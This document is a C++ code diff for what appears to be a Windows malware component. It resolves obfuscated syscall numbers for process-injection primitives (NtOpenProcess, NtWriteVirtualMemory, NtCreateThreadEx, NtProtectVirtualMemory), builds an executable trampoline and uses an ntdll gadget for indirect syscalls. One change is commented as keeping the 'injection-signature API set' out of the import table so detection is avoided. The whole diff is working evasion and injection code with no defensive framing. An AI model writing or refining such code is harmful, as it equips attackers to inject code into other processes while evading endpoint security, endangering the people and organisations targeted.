@@ -1,6 +1,5 @@
 #include "lge_syscalls.h"
 #include "dynresolve.h"
-#include <mutex>
 
 #pragma pack(push, 1)
 struct LgeTrampoline {
@@ -14,10 +13,26 @@ struct LgeTrampoline {
 #pragma pack(pop)
 
 namespace {
-    std::mutex g_LgeMutex;
+    // CRITICAL_SECTION instead of std::mutex: avoids linking winpthreads, which
+    // would otherwise import the injection-signature API set into the IAT.
+    CRITICAL_SECTION g_LgeCs = {};
+    LONG g_LgeCsInit = 0;
     uint8_t* g_Trampoline = nullptr;
     uint64_t g_Gadget = 0;
     bool     g_Ready = false;
+
+    CRITICAL_SECTION* GetLgeCs() {
+        if (InterlockedCompareExchange(&g_LgeCsInit, 1, 0) == 0) {
+            InitializeCriticalSection(&g_LgeCs);
+            InterlockedExchange(&g_LgeCsInit, 2);
+        }
+        while (g_LgeCsInit != 2) { SwitchToThread(); }
+        return &g_LgeCs;
+    }
+    struct LgeCsGuard {
+        LgeCsGuard() { EnterCriticalSection(GetLgeCs()); }
+        ~LgeCsGuard() { LeaveCriticalSection(GetLgeCs()); }
+    };
 }
 
 DWORD g_SysNtOpenProcess = 0;
@@ -63,12 +78,12 @@ static bool LgeBuildTrampoline() {
     static constexpr auto obfNtdll = MAKE_OBF("ntdll.dll");
     static constexpr auto obfAlloc = MAKE_OBF("NtAllocateVirtualMemory");
 
-    HMODULE hNtdll = DynGetModuleHandle(DECR_STR(obfNtdll).c_str());
+    HMODULE hNtdll = DynGetModuleHandle(DECR_STR(obfNtdll));
     if (!hNtdll) return false;
 
     using pNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
     pNtAllocateVirtualMemory fnAlloc =
-        (pNtAllocateVirtualMemory)DynGetProcAddress(hNtdll, DECR_STR(obfAlloc).c_str());
+        (pNtAllocateVirtualMemory)DynGetProcAddress(hNtdll, DECR_STR(obfAlloc));
     if (!fnAlloc) return false;
 
     PVOID mem = nullptr;
@@ -82,7 +97,7 @@ static bool LgeBuildTrampoline() {
 }
 
 bool LgeInitialize() {
-    std::lock_guard<std::mutex> lock(g_LgeMutex);
+    LgeCsGuard lock;
     if (g_Ready) return true;
 
     static constexpr auto obfNtOpenProcess = MAKE_OBF("NtOpenProcess");
@@ -95,15 +110,15 @@ bool LgeInitialize() {
     static constexpr auto obfNtWaitForSingleObject = MAKE_OBF("NtWaitForSingleObject");
     static constexpr auto obfNtProtectVirtualMemory = MAKE_OBF("NtProtectVirtualMemory");
 
-    g_SysNtOpenProcess = GetSyscallNumber(DECR_STR(obfNtOpenProcess).c_str());
-    g_SysNtAllocateVirtualMemory = GetSyscallNumber(DECR_STR(obfNtAllocateVirtualMemory).c_str());
-    g_SysNtWriteVirtualMemory = GetSyscallNumber(DECR_STR(obfNtWriteVirtualMemory).c_str());
-    g_SysNtFreeVirtualMemory = GetSyscallNumber(DECR_STR(obfNtFreeVirtualMemory).c_str());
-    g_SysNtCreateThreadEx = GetSyscallNumber(DECR_STR(obfNtCreateThreadEx).c_str());
-    g_SysNtClose = GetSyscallNumber(DECR_STR(obfNtClose).c_str());
-    g_SysNtQueryInformationProcess = GetSyscallNumber(DECR_STR(obfNtQueryInformationProcess).c_str());
-    g_SysNtWaitForSingleObject = GetSyscallNumber(DECR_STR(obfNtWaitForSingleObject).c_str());
-    g_SysNtProtectVirtualMemory = GetSyscallNumber(DECR_STR(obfNtProtectVirtualMemory).c_str());
+    g_SysNtOpenProcess = GetSyscallNumber(DECR_STR(obfNtOpenProcess));
+    g_SysNtAllocateVirtualMemory = GetSyscallNumber(DECR_STR(obfNtAllocateVirtualMemory));
+    g_SysNtWriteVirtualMemory = GetSyscallNumber(DECR_STR(obfNtWriteVirtualMemory));
+    g_SysNtFreeVirtualMemory = GetSyscallNumber(DECR_STR(obfNtFreeVirtualMemory));
+    g_SysNtCreateThreadEx = GetSyscallNumber(DECR_STR(obfNtCreateThreadEx));
+    g_SysNtClose = GetSyscallNumber(DECR_STR(obfNtClose));
+    g_SysNtQueryInformationProcess = GetSyscallNumber(DECR_STR(obfNtQueryInformationProcess));
+    g_SysNtWaitForSingleObject = GetSyscallNumber(DECR_STR(obfNtWaitForSingleObject));
+    g_SysNtProtectVirtualMemory = GetSyscallNumber(DECR_STR(obfNtProtectVirtualMemory));
 
     if (g_SysNtOpenProcess == 0 || g_SysNtAllocateVirtualMemory == 0 ||
         g_SysNtWriteVirtualMemory == 0 || g_SysNtFreeVirtualMemory == 0 ||
@@ -113,7 +128,7 @@ bool LgeInitialize() {
     }
 
     static constexpr auto obfNtdll = MAKE_OBF("ntdll.dll");
-    HMODULE hNtdll = DynGetModuleHandle(DECR_STR(obfNtdll).c_str());
+    HMODULE hNtdll = DynGetModuleHandle(DECR_STR(obfNtdll));
     g_Gadget = LgeLocateGadget(hNtdll);
     if (!g_Gadget) return false;
 
@@ -132,7 +147,7 @@ NTSTATUS LgeInvoke(DWORD ssn,
         return (NTSTATUS)0xC0000001L; 
     }
 
-    std::lock_guard<std::mutex> lock(g_LgeMutex);
+    LgeCsGuard lock;
 
     LgeTrampoline* t = (LgeTrampoline*)g_Trampoline;
     t->mov_r10_rcx[0] = 0x4C; t->mov_r10_rcx[1] = 0x8B; t->mov_r10_rcx[2] = 0xD1;
